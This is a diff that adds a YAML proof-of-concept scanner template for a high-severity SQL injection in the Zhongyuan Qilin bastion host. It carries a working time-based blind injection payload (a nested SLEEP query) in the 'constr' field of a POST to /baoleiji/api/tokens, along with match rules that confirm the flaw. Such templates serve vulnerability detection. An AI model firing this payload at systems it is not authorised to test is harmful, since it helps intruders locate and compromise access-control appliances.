@@ -1,0 +1,17 @@
+id: poc-yaml-zyql-blj-SQL-injection
+info:
+  name: 中远麒麟堡垒机SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: nginx
+variables:
+  t1: random_int(5,10)
+  t2: random_int(5,10)
+requests:
+- method: POST
+  path: /baoleiji/api/tokens
+  data: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP( {{.t1}} )))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1
+  expression: status_code == 403 && duration > t1 && contains(body, "{\"message\":\"Permission
+    Denied.\",\"translatableMessage\"")
+transport: http
